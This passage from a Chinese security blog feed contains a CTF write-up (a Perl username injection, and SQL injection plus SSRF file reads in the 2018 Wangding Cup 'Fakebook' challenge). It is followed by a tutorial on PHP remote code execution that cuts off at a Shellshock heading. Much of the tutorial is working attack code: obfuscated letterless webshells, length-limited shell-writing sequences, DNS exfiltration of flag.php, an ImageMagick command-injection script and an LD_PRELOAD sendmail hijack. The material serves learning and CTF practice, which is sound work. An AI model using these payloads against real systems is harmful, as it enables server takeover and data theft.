把用户名写入了评论文件中</p><blockquote><p>所以如果用户名是一段可执行的代码,格式为wtf,那么就可以成功利用</p></blockquote><p>创建一个用户名为<code>${find,/,-name,get_flag2}</code>的用户</p><p>获取flag2的路径为<code>/usr/bin/get_flag2</code></p><p><img src="https://i.loli.net/2020/01/22/NUlyj4aXkVQeFoT.png" alt></p><p>得到flag2</p><p><img src="https://i.loli.net/2020/01/22/9XLlQ5ZJCW1Ud8F.png" alt></p><p>最终的flag,其实flag不重要了,学习更多的姿势才重要</p><pre><code>xctf{cb49256d1ab48803149e5ec49d3c29ca}</code></pre><p>有感而发,Web狗要学(了解)的东西真多,最近做题发现要知道<code>Perl</code>,<code>Bash</code>,<code>Python web</code>,<code>Java Web</code>,<code>各种框架</code>….都有… <strong><em>路真的很长</em></strong>,学的效果也不知道怎么样,只能通过刷题增加见识和知识面了.</p><blockquote><p>多操作.</p></blockquote><h1 id="网鼎杯-2018-Fakebokk"><a href="#网鼎杯-2018-Fakebokk" class="headerlink" title="网鼎杯 2018 Fakebokk"></a>网鼎杯 2018 Fakebokk</h1><p>拿到题目,有两个功能点,一个是login一个是join,先随便注册一个账号,然后登陆,发现url为<code>/?no=1</code>,我先猜测的是存在文件包含漏洞,当输入文件包含的语句时,出现了SQL查询语句报错</p><p><img src="https://i.loli.net/2020/01/22/iSWLf2Ps6xNyZ1u.png" alt></p><p>思路于是转移到sql注入上去,第一次尝试构造<code>1&#39;union select 1,2,3#</code>出现语句报错而去掉那个<code>&#39;</code>后就可以正常的sqli了,后端代码可能是把变量no直接当做查询的变量(小白语录)….</p><p>后面直接按照正常的手工注入进行查询即可</p><p><strong>在url中++被当做空格处理</strong></p><p><img src="https://i.loli.net/2020/01/22/tBexMu6hlQ2z5ko.png" alt></p><p><img src="https://i.loli.net/2020/01/22/8sVPboku2H7UiD1.png" alt></p><p><img src="https://i.loli.net/2020/01/22/FmXyYI4PBDVCOHN.png" alt></p><p>从报错中我们可以看到有<code>unserizlize()</code>函数,可知在后端肯定是用了序列化来处理数据的,从的得到user的data的数据,是一个序列化后的数据</p><pre><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:19:&quot;http://hack-for.fun&quot;;}            </code></pre><p>然后做到这里可能就没思路了,<code>一直都在说,但一直都会忘记,或许在实战中,这也是一个非常重要的点,就是没有思路了就用一下robots.txt</code></p><p>进行目录扫描,确实存在<code>robots.txt</code>,进入其中的目录,down下源码</p><p>对源码进行审计发现,存在一个发起curl会话的<code>get($url)</code>,<a href="[http://hack-for.fun/2020/01/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0SSRF%E6%BC%8F%E6%B4%9E/#PHP-function](http://hack-for.fun/2020/01/20/一篇文章深入学习SSRF漏洞/#PHP-function)">从昨天的笔记中</a>讲到<code>curl_exec()</code>函数,这些函数<code>都必须当做敏感函数牢记在心!</code></p><p><img src="https://i.loli.net/2020/01/22/oirDOgdPRJcajkG.png" alt></p><p>好了,利用点就是<code>本地SSRF利用file协议读取文件</code>了,由于报错中已经给了我们地址</p><p><code>/var/www/html</code></p><p>所以,payload</p><p><code>http://111.198.29.45:46684/view.php?no=-1++union++select++1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:1;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27</code></p><p>右键查看源码后,在<code>&lt;iframe&gt;标签中的src属性中点击得到flag</code></p><p>so fun it is !  hack for fun !(fxxk,虽然今天差点被安洵杯easy_web气死,明天去网吧试试…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 经典题目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> SSRF </tag>
            
            <tag> Perl </tag>
            
            <tag> 目录穿越 </tag>
            
            <tag> cookie欺骗 </tag>
            
            <tag> 后门利用 </tag>
            
            <tag> Bash web server </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习RCE漏洞</title>
      <link href="/posts/20200117/"/>
      <url>/posts/20200117/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言背景"><a href="#0x00-前言背景" class="headerlink" title="0x00  前言背景"></a>0x00  前言背景</h1><blockquote><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。<br>远程系统命令执行<br>一般出现这种漏洞，是因为应用系统从设计上需要给用户<strong>提供指定的远程命令操作的接口</strong>，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 ，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><p>远程代码执行<br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了<strong>不安全的反序列化</strong>等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 </p></blockquote><p> 远程命令/代码执行漏洞(Remote Code/Command Execution Vulnerability)，用户通过<a href="https://baike.baidu.com/item/浏览器/213911" target="_blank" rel="noopener">浏览器</a>提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定<a href="https://baike.baidu.com/item/绝对路径/481185" target="_blank" rel="noopener">绝对路径</a>的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 </p><p>能造成这个漏洞的条件同样也是</p><ul><li>用户能够控制函数的输入</li><li>存在可以执行代码的危险函数</li></ul><p>远程代码执行只是执行PHP代码(只是针对PHP后端语言来说的话),而远程命令执行是执行cmd或者终端命令,是系统命令</p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><p>下面来看看最简单的代码示例: </p><p><strong>代码执行</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'what'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// echo $b;</span>    <span class="token delimiter">?></span></code></pre><p><code>eval()</code>函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p><img src="https://i.loli.net/2020/01/15/RGoXhN8DiIvfQSz.png" alt></p><p>我们提交url?what=phpinfo(); 就可以执行得到phpinfo界面,当然和eval函数类似的还有很多</p><p><strong>命令执行</strong></p><pre class=" language-PHP"><code class="language-PHP"><?php  $a = @shell_exec($_GET['what']);  echo $a;  ?></code></pre><p><img src="https://i.loli.net/2020/01/15/f4KvZDCcUNE5aRr.png" alt></p><p>可以看到,这里执行了系统cmd命令</p><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><p>关于RCE的基础知识,估计也就是PHP相关函数(也就是危险函数)的基础知识,Linux Windows常见的(在安全中)系统命令</p><h2 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h2><p><strong>PHP允许动态函数执行</strong>,这是很多高级RCE场景中常常利用的点</p><p><strong>eval()函数</strong></p><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p><img src="https://i.loli.net/2020/01/15/W1UvGkfR7QTrYgp.png" alt></p><p><strong>assert()函数</strong></p><p><img src="https://i.loli.net/2020/01/15/ZiMWXcIseBynkq2.png" alt></p><p><strong>preg_replace()+/e</strong></p><p>php版本&lt;5.5.0</p><p>如果preg_replace()的第一个参数中存在/e模式修饰符,则允许代码执行</p><p>现在已经被弃用,使用了preg_replace_callback()替代可能在CTF中会遇到</p><p><img src="https://i.loli.net/2020/01/15/3zZ1Xsqrt9FaeAI.png" alt></p><p><strong>system(), exec(), shell_exec, passthru, pcntl_exec, popen, proc_popen等</strong></p><p>这些函数是用于执行<code>command</code>命令的</p><p><img src="https://img2018.cnblogs.com/blog/1270588/201908/1270588-20190822193956941-300893444.png" alt></p><p><img src="https://img2018.cnblogs.com/blog/1270588/201908/1270588-20190822194007335-1556096688.png" alt></p><p><img src="https://img2018.cnblogs.com/blog/1270588/201908/1270588-20190822194017718-887173953.png" alt></p><p>还有 ``` `运算符可以执行其中的命令 反引号是PHP中最简单的执行shell的方法</p><h2 id="相关系统命令知识基础"><a href="#相关系统命令知识基础" class="headerlink" title="相关系统命令知识基础"></a>相关系统命令知识基础</h2><h3 id="Windows系统管道符"><a href="#Windows系统管道符" class="headerlink" title="Windows系统管道符"></a>Windows系统管道符</h3><p><img src="https://img-blog.csdnimg.cn/20190914170045697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt></p><p>;分号的作用是用来连续执行系统命令</p><h3 id="Linux系统管道符"><a href="#Linux系统管道符" class="headerlink" title="Linux系统管道符"></a>Linux系统管道符</h3><p><img src="https://img-blog.csdnimg.cn/20190914170106366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt></p><p><strong>ls命令</strong>,ls是list的缩写,可跟路径或者参数,表示列出路径或目录下所有文件信息 ls -I 显示当前路径下的所有文件及文件夹的详细信息</p><p><strong>cat命令</strong>,cat是concatenate的缩写,表示<strong>读取</strong>文件内容及拼接文件</p><p><strong>rm命令</strong>, re是remove的缩写,用于删除文件或者文件夹,-r删除目录 -f强制删除</p><p><strong>mkdir命令</strong>, 是make directory的缩写,用于创建文件夹.</p><p><strong>find命令</strong></p><blockquote><p> find   path   -option   [   -print ]   [ -exec   -ok   command ]   {} ;</p></blockquote><p>CTF常用 : find / -name flag</p><p><strong>grep命令</strong></p><p>grep命令用于查找文件里符合条件的字符串。</p><p>Linux下<strong>glob通配符</strong></p><blockquote><p>*可以代替0个及以上任意字符 </p><p>?可以代表1个任意字符</p></blockquote><p><strong>Linux shell</strong></p><blockquote><p>shell可以利用.来执行任意脚本</p><p>Linux文件名支持用glob通配符代替</p></blockquote><p>.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。</p><p>用. file执行文件，是不需要file<strong>有x权限的</strong>。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？</p><p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。</p><p>ascii码表中 大写字母位于<code>@</code>与<code>[</code>之间,使用glob通配符[@-[]就可以用来表示大写字母</p><h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02  漏洞原理"></a>0x02  漏洞原理</h1><p> 由于开发人员编写源码，没有针对代码中可执行的<a href="https://baike.baidu.com/item/特殊函数/10555419" target="_blank" rel="noopener">特殊函数</a>入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中<a href="https://baike.baidu.com/item/WEB服务器/8390210" target="_blank" rel="noopener">WEB服务器</a>没有过滤类似<a href="https://baike.baidu.com/item/system/15078602" target="_blank" rel="noopener">system</a>(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。 </p><p>RCE分类的话分为<strong>有回显</strong>和<strong>无回显</strong>两种情况</p><p>有回显的话也就不用过多结束了,就是payload打过去有结果输出,没输出就检查思路</p><p><strong>无回显的情况</strong>          </p><p>1)判断</p><p>利用延时</p><p><code>ls;sleep 3</code></p><p>http/dns请求</p><p>2)利用</p><p>写shell(直接带入/外部下载)</p><p>echo &gt;</p><p>wget 下载    </p><p>http/dns等方式带出数据,需要去掉空格,使用sed命令</p><pre><code>echo `cat flag.php|sed s/[[:space;]]//`.php.xxxx.eee.xyz                  </code></pre><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03  漏洞利用"></a>0x03  漏洞利用</h1><p>利用RCE,简单的就是读写文件,高级点的就是getshell</p><p>读写文件主要就是利用上面写到的一些命令或者代码,当然还有非常多其他的.需要在实践中继续发现利用总结.</p><p><strong>如何getshell?</strong></p><p><strong>挖掘漏洞的过程, 通常需要先找到危险函数, 然后回溯函数的调用过程, 最终看在整个调用的过程中是否有可能控制输入</strong></p><h1 id="0x04-bypass"><a href="#0x04-bypass" class="headerlink" title="0x04  bypass"></a>0x04  bypass</h1><h2 id="1-命令执行的分隔符"><a href="#1-命令执行的分隔符" class="headerlink" title="1)命令执行的分隔符"></a>1)命令执行的分隔符</h2><p>例子：<code>system(&quot;echo &quot;.$_GET[1]);</code></p><table><thead><tr><th align="center">功能</th><th align="center">符号</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">换行符</td><td align="center">%0a</td><td align="center">?1=123%0apwd</td></tr><tr><td align="center">回车符</td><td align="center">%0d</td><td align="center">同上</td></tr><tr><td align="center">连续指令</td><td align="center">;</td><td align="center">?1=123;pwd</td></tr><tr><td align="center">后台进程</td><td align="center">&amp;</td><td align="center">?1=123&amp;pwd</td></tr><tr><td align="center">管道符</td><td align="center">|(显示后面语句的结果)</td><td align="center">?1=123|pwd</td></tr><tr><td align="center">逻辑运算</td><td align="center">||或&amp;&amp;</td><td align="center">?1=123||pwd</td></tr></tbody></table><h2 id="2-空格代替"><a href="#2-空格代替" class="headerlink" title="2)空格代替"></a>2)空格代替</h2><ul><li>&lt;</li><li>$IFS</li><li>${IFS}</li><li>$IFS$9</li><li>%09(URL中)</li></ul><h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3)绕过过滤"></a>3)绕过过滤</h2><p>可以采用组合([<strong>拼接</strong>)的形式</p><p>如: a=l;b=s;$a$b   <strong>=&gt;</strong> ls</p><p><strong>编码</strong>绕过</p><pre><code>`echo d2hvYW1p|base64 -D`  =&gt; `echo whoami`</code></pre><p><strong>反斜杠</strong>绕过</p><p>ca\t /fl\ag <strong>=&gt;</strong> cat /flag</p><h2 id="4-绕过长度限制"><a href="#4-绕过长度限制" class="headerlink" title="4)绕过长度限制"></a>4)绕过长度限制</h2><p><strong>1、15个字符</strong></p><pre><code>echo  \&lt;?php &gt;1echo eval\(&gt;&gt;1echo \$_GET&gt;&gt;1echo \[1\]&gt;&gt;1echo \)\;&gt;&gt;1mv 1 1.php</code></pre><p><strong>2、7个字符</strong></p><p>思路：<br>1、<code>命令+&gt;文件名</code>可以生产文件(命令可以为空)<br>2、<code>ls -t</code>可以将文件按时间顺序排列<br>3、<code>sh</code>命令可以执行sh脚本<br>4、base64命令可以避免特殊字符<br>5、\可以分行输入命令</p><pre><code>w&gt;hpw&gt;1.p\\w&gt;d\&gt;\\w&gt;\ -\\w&gt;e64\\w&gt;bas\\w&gt;7\|\\w&gt;XSk\\w&gt;Fsx\\w&gt;dFV\\w&gt;kX0\\w&gt;bCg\\w&gt;XZh\\w&gt;AgZ\\w&gt;waH\\w&gt;PD9\\w&gt;o\ \\w&gt;ech\\ls -t|\sh</code></pre><h2 id="5-无字母数字webshell"><a href="#5-无字母数字webshell" class="headerlink" title="5)无字母数字webshell"></a>5)无字母数字webshell</h2><p>PHP5不能利用($a)();执行函数,PHP7可以</p><p><strong>主要思路: 利用位运算,自增运算符</strong></p><p><strong>对变量进行取反,异或</strong>,最后动态执行函数</p><p><strong>在PHP中,两个字符串执行异或操作异或以后,得到的还是一个字符串</strong></p><pre><code>$_=&#39;&lt;&gt;]=@^&lt;&#39;^&#39;[[){,?[&#39;;//$_=&#39;getFlag&#39;\n $_();//getFlag()</code></pre><p>比如绕过</p><pre class=" language-php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-0]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><strong>异或</strong></p><p>就需要找到两个非字母,数字的字符,使他们异或的结果是这个字母即可</p><p>PHP5中的一些现成payload(参考P神的文章)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%01'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%05'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%12'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%14'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='assert';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0D'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%2F'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0E'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $__='_POST';</span><span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// assert($_POST[_]);</span><span class="token delimiter">?></span></code></pre><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.jpg" alt></p><p><strong>取反</strong></p><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p><pre class=" language-PHP"><code class="language-PHP"><?php$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);?></code></pre><p>不得不佩服为什么P神这么牛了</p><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg" alt></p><p>这个方法同时利用了PHP弱类型,因为要获取<code>&#39;和&#39;{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><p><strong>利用自增运算符</strong></p><p>先学习一下下面这个知识点</p><blockquote><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串</p><p>PHP函数是大小写不敏感的 </p></blockquote><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><pre class=" language-PHP"><code class="language-PHP"><?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);?></code></pre><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.jpg" alt></p><h2 id="6-绕过字符限制getshell"><a href="#6-绕过字符限制getshell" class="headerlink" title="6)绕过字符限制getshell"></a>6)绕过字符限制getshell</h2><p>知识点</p><ul><li>ip进制转换后是等价</li></ul><pre class=" language-python"><code class="language-python">ip <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token comment" spellcheck="true"># 十六进制</span><span class="token keyword">print</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 长整数</span><span class="token keyword">print</span> int<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 八进制</span><span class="token keyword">print</span> <span class="token string">'0'</span> <span class="token operator">+</span> oct<span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li>利用续行符拆分命令成多行</li></ul><p><img src="https://p5.ssl.qhimg.com/t01d2eac72941e42be9.png" alt></p><p><img src="https://p4.ssl.qhimg.com/t016294d3a767429eab.png" alt></p><p>dir命令和ls命令差不多.但是dir在alphabetical序中靠前,二是按列输出不换行</p><p>rev命令的作用是反转文件每一行的内容</p><h2 id="7-绕过disable-function"><a href="#7-绕过disable-function" class="headerlink" title="7)绕过disable_function"></a>7)绕过disable_function</h2><p>一般来说，最简单的绕过disable_function的办法，dl函数，proc_open函数，漏洞版本的imagemagic等</p><p>但是绕过这个点的话,一直以来都是许多安全研究员的主要方向,可以说是姿势很多.</p><p><strong>利用系统组件绕过</strong>,这里就直接搬别人的笔记过来</p><h3 id="1-利用window-com组件"><a href="#1-利用window-com组件" class="headerlink" title="1)利用window com组件"></a>1)利用window com组件</h3><p>php 5.4版本. 大于这个版本的需要自己添加扩展</p><p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529112614451-922493076.png" alt></p><p>解决办法 删除System32目录下的wshom.ocx文件</p><h3 id="2-利用ImageMagick漏洞"><a href="#2-利用ImageMagick漏洞" class="headerlink" title="2)利用ImageMagick漏洞"></a>2)利用ImageMagick漏洞</h3><p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529143616706-2088599156.png" alt></p><p>如果给了PHPINFO信息,如果存在以上内容,就可以尝试利用这个点来绕过</p><pre class=" language-PHP"><code class="language-PHP"><?phpecho "Disable Functions: " . ini_get('disable_functions') . "\n";$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];if ($command == '') {    $command = 'id';}$exploit = <<<EOFpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|$command")'pop graphic-contextEOF;file_put_contents("KKKK.mvg", $exploit);$thumb = new Imagick();$thumb->readImage('KKKK.mvg');$thumb->writeImage('KKKK.png');$thumb->clear();$thumb->destroy();unlink("KKKK.mvg");unlink("KKKK.png");?></code></pre><h3 id="3-利用环境变量LD-PRELOAD"><a href="#3-利用环境变量LD-PRELOAD" class="headerlink" title="3)利用环境变量LD_PRELOAD"></a>3)利用环境变量LD_PRELOAD</h3><p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的</p><p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的</p><pre class=" language-PHP"><code class="language-PHP">#include<stdlib.h>#include <stdio.h>#include<string.h>void payload(){         FILE*fp = fopen("/tmp/2.txt","w");         fclose(fp);         system("mkdir /var/www/html/test"); }int geteuid(){  FILE *fp1=fopen("/tmp/2.txt","r");  if(fp1!=NULL)  {   fclose(fp1);         return 552;        }else {         payload();         return 552;       }}</code></pre><p>执行命令编译为一个动态共享库</p><pre><code>gcc -c -fPIC a.c -o agcc -shared a -o a.so</code></pre><p>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。结果为</p><pre class=" language-PHP"><code class="language-PHP"><?php   putenv("LD_PRELOAD=/var/www/html/a.so");   mail("[email protected]","","","","");  ?></code></pre><p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190529145914202-1141401503.png" alt></p><p>所以要学好C语言,不然后面一些阶段,尤其是内网写shellcode的时候</p><p>所以我打算寒假学一下<strong>Windows核心编程</strong></p><h3 id="4-CVE-2014-6271"><a href="#4-CVE-2014-6271" class="headerlink" title="4)CVE-2014-6271"></a>4)CVE-2014-6271</h3><pre class=" language-php"><code class="language-php"><span class="token 